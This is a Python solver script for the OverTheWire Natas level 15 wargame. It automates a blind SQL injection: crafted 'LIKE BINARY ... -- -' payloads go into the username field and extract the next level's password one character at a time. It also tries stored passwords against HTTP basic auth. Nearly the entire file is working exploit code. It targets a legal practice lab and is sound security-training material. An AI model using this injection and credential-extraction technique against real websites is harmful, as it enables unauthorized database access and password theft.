#!/usr/bin/env python

import requests
import string
import re
import sys

from pathlib import Path
from bs4 import BeautifulSoup
from statuslib import status as s

# Natas 15 blind sql injection

"""/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/"""


## Change values of the payload
## SQL query is hardcoded on line 76 and 88

sql_username = 'natas16'    # verified existing on the database
save_the_flag = True

## --


def get_password(url, username, passwords):

    for password in passwords:

        password = password.strip()
        http = requests.post(url, auth=(username, password))

        if http.status_code != 200:
            pass

        else:
            return password


def web_request(url, username, password):

    http = requests.post(url, auth=(username, password))

    if http.status_code != 200:
        s.failed('Failed -> ERROR status code: %s' % (http.status_code))
        return http.status_code
    else:
        s.success('Success -> OK status code: %s' % (http.status_code))
        return http.status_code


def send_form_data(url, username, password, status_code, **kwargs):

    http = requests.post(url, auth=(username, password))

    payload1 = kwargs['payload1']

    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    verified = ''
    sql_passwd = ''
    if status_code != 200:
        s.failed('Failed. Unable to connect -> ERROR status code: %s' % (http.status_code))
        sys.exit(1)

    else:
        try:
            s.working('Querying to database this may take time.. -> status code: %s\n' % (http.status_code))

            for char in chars:
                post_data = {
                        'username': '%s" and password LIKE BINARY "%%%s%%" -- -' % (payload1, char)
                }

                verify_query = requests.post(url, auth=(username, password), data=post_data)
                if 'exists' in verify_query.text:
                    verified += char
            
            # password is 32 chars 32, iterations
            for i in range(0,32):
                for char in verified:
                
                    post_data = {
                           'username': '%s" and password LIKE BINARY "%s%s%%" -- -' % (payload1, sql_passwd, char)       
                    }
                    
                    send_query = requests.post(url, auth=(username, password), data=post_data)
                    if 'exists' in send_query.text :
                        sql_passwd = sql_passwd + char
                        break
            
            s.success('Enjoy your flag! -> %s' % (sql_passwd))
            return sql_passwd

        except AttributeError:
            pass
    


def save_flag(data, save=False):
    try:
        if save:
            with open('flag.txt', 'w') as f:
                f.write(data)

    except TypeError:
        pass
    

def main(url, username, passwords, save=False, **kwargs):

    payload1 = kwargs['sql_username']

    s.info('Started. -> Exploiting %s' % (username))
    s.working('Connecting -> to target server..\n')

    password = get_password(url, username, passwords)
    status = web_request(url, username, password)
    flag = send_form_data(url,
                          username,
                          password,
                          status_code=status,
                          payload1=payload1
                         )
    save_flag(flag, save=save)

if __name__ == '__main__':

    level = 15
    username = '%s%s' % ('natas', level)
    passwords = open(Path('../passwords.txt'), 'r').readlines()
    
    url = 'http://%s.natas.labs.overthewire.org/' % username

    main(url, username, passwords, save=save_the_flag,
         sql_username=sql_username)

